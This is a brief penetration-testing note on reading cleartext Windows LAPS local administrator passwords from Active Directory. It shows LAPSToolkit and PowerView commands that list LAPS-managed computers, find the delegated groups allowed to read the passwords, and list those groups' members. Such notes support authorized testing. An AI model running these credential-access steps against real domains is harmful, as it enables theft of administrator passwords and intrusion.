# Windows Credentials - LAPS 

If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory as part of a penetration test.

We can use the LAPSToolkit PowerShell script, which is essentially a wrapper script around the PowerView Active Directory enumeration PowerShell script.

```PowerShell
PS C:\Tools> Import-Module .\LAPSToolkit.ps1
PS C:\Tools> Get-LAPSComputers

ComputerName		Password 	Expiration
------------		-------- 	----------
dev.sinhack.com	       04/12/2021 	02:13:25
```

We have discovered the dev server, which is managed by LAPS, we cannot view the clear text password.

In this case, our current user account does not have permissions to read the password.

We can use the Find-LAPSDelegatedGroups method of LAPSToolkit to discover groups that can fully enumerate the LAPS data.

```PowerShell
PS C:\Tools> Find-LAPSDelegatedGroups
```

Next we can use PowerView to enumerate members of that group.

```PowerShell
PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers"
```

Users part of the group are allowed to see the plain text password with the LAPSToolKit and Get-LAPSComputers command.